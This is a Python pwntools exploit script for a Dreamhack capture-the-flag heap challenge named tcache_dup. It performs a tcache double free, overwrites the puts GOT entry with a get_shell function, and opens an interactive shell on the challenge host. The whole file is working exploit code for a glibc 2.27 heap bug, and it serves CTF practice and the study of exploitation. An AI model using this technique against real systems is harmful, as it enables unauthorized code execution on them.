#!/usr/bin/env python3

from pwn import *

exe = ELF("./tcache_dup_patched", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context.binary = exe

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("host3.dreamhack.games", 12459)

def create(size, data):
    p.sendlineafter(b'> ', str(1))
    p.sendlineafter(b'Size: ', str(size))
    p.sendafter(b'Data: ', data)

def delete(idx):
    p.sendlineafter(b'> ', str(2))
    p.sendlineafter(b'idx: ', str(idx))

# input()

create(0x20, b'a'*8)
# double free: a <- a
delete(0)
delete(0)

# got@puts = get_shell
create(0x20, p64(exe.got['puts']))
create(0x20, p64(exe.got['puts']))
create(0x20, p64(exe.sym['get_shell']))

p.interactive()